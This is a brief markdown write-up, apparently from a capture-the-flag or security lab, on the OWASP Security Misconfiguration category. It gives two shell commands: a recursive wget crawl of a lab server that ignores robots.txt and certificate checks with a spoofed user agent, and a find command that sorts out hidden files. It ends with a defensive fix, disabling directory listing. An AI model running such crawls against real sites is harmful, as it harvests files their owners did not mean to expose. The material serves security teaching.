# [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)

## Exploit

```sh
wget -r -l inf --no-check-certificate -e robots=off -U "Mozilla/5.0" http://10.0.2.5
find .hidden -type f ! -size 34c ! -name "*.html"
```

## Solution

Disable directory listing and access to unnessary files.
